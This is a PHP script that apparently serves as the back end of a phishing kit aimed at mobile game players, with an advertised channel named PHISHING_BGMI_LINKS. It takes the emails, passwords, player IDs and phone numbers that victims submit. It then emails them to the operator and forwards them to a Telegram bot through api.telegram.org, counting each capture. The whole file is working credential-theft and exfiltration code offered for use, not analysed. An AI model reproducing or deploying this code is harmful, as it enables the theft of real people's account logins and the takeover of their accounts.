<?php

$path = 'data/cheif.json';
$info = file_get_contents($path);
$infoArray = json_decode($info, true);
$name = $infoArray['name'];
$senderMail = $infoArray['sender'];
$recvemail = $infoArray['email'];
$banner = $infoArray['banner'];

date_default_timezone_set('Asia/Kolkata');
$cheifyt = date('h:i:s d-m-Y');

$sender = "From: $name <$senderMail>";

$email = $_POST['email'];
$password = $_POST['password'];
$uid = $_POST['uid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];

if ($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == "") {
    header("Location:index.php");
} else {

    $subjek = "+91 | 🇮🇳 | LEVEL $level | LOGIN $login | EMAIL $email | PASSWORD $password";
    $pesan = '
    <style>
        @keyframes neon {
            0% {
                text-shadow: 0 0 10px #000, 0 0 20px #000, 0 0 30px #ff00de, 0 0 40px #e6c200, 0 0 70px #e6c200, 0 0 80px #ff00de, 0 0 100px #ff00de, 0 0 150px #e6c200;
            }
            100% {
                text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #ff0000, 0 0 40px #ff0000, 0 0 70px #e6c200, 0 0 80px #ff0000, 0 0 100px #e6c200, 0 0 150px #ff0000;
            }
        }
        .neon-effect {
            animation: neon 1.5s infinite alternate;
        }
    </style>
    <center>
    <div class="neon-effect" style="background: url('.$banner.') no-repeat;border:2px solid white;background-size: 100% 100%; width: 100%; height: 120px; color: #fff; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
    </div>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,red,red); color: #fff; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">
WEB BY CHEIF_YT
</div>
<table border="1" bordercolor="#e6c200" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:linear-gradient(90deg, #000, #000, #000); animation: neon 1.5s infinite alternate;" class="neon-effect"> 
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>' . $email . '</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>' . $password . '</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>' . $uid . '</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>' . $phone . '</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>' . $level . '</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>' . $login . '</th> 
</tr>
</table>
<div style="border:2px solid white; width: 90%; font-weight:bold; height: 20px; background: linear-gradient(90deg,red,red); color: #fff; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 1px; text-align:center;">
ADDITIONAL INFORMATION
</div>
<table border-radius: 5px; border-color: #000; bordercolor="#e6c200" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse: collapse; width: 100%; background:linear-gradient(90deg,black,black);"> 
                <th border-color: #000; style="padding:3px;width: 80%; text-align: left;" height="25px"><b>CONTACT ME</th>
                <th style="padding:3px;width: 50%; text-align: right;" height="25px"><b><a href="https://telegram.me/CHEIF_YT">CLICK HERE</a></th> 
            </tr>
</table>
<div style="width: 100%; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
JOIN TG CHANNEL:
</div>
<div style="float: right;">
<a href="https://telegram.me/PHISHING_BGMI_LINKS"><img style="margin: 5px;" width="35" src="https://i.ibb.co/PzCzKhZ/7f83eabff810.jpg"></a>
</div>
 <center>
';
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= '' . $sender . '' . "\r\n";
    $kirim = mail($recvemail, $subjek, $pesan, $headers);
}

// Read bot token from file
$botToken = file_get_contents('admin/bottoken.txt');

// Read chat ID from file
$chatId = file_get_contents('admin/chatid.txt');

// Define user data
$email = $_POST['email'];
$password = $_POST['password'];
$uid = $_POST['uid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];

// Get current timestamp in Asia/Kolkata timezone
date_default_timezone_set('Asia/Kolkata');
$cheifyt = date('h:i:s d-m-Y');

// File to store message counts
$countFile = 'admin/cheifcount.txt';

// Function to read message counts from file
function readMessageCounts($countFile) {
    $counts = [];
    if (file_exists($countFile)) {
        $data = file_get_contents($countFile);
        $counts = unserialize($data);
    }
    return $counts;
}

// Function to write message counts to file
function writeMessageCounts($counts, $countFile) {
    $data = serialize($counts);
    file_put_contents($countFile, $data);
}

// Function to get the count of a message
function getMessageCount($message, &$counts) {
    return isset($counts[$message]) ? $counts[$message] : 0;
}

// Function to update the count of a message
function updateMessageCount($message, &$counts) {
    if (isset($counts[$message])) {
        $counts[$message]++;
    } else {
        $counts[$message] = 1;
    }
}

// Read message counts from file
$counts = readMessageCounts($countFile);

// Increment and get the count of the message
$count = getMessageCount($text, $counts) + 1;

// Update the count
updateMessageCount($text, $counts);

// Append count information to the message
$messageWithCount = "╭─────── 𝗖𝗛𝗘𝗜𝗙 𝗬𝗧 #$count ───────╮\n" . '
╰┈➤ 𝗘𝗺𝗮𝗶𝗹/𝗣𝗵𝗼𝗻𝗲 : `'.$email.'`

╰┈➤ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : `'.$password.'`

╰┈➤ 𝗣𝗹𝗮𝘆𝗲𝗿 𝗜𝗗: `'.$uid.'`

╰┈➤ 𝗣𝗵𝗼𝗻𝗲 𝗡𝗼 : `'.$phone.'` 

╰┈➤ 𝗟𝗲𝘃𝗲𝗹 : '.$level.'

╰┈➤ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : '.$login.'

╰┈➤ 𝗧𝗶𝗺𝗲 : '.$cheifyt.'
    
╰┈➤ 𝗪𝗲𝗯 𝗕𝘆 • CHEIF YT'; 

// Encode the modified message
$tpWithCount = urlencode($messageWithCount);

// Send the modified message
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$tpWithCount";
$result = file_get_contents($url);
if ($result === false) {
    error_log("Error sending message to user {$chatId}");
}

// Write updated message counts to file
writeMessageCounts($counts, $countFile);

?>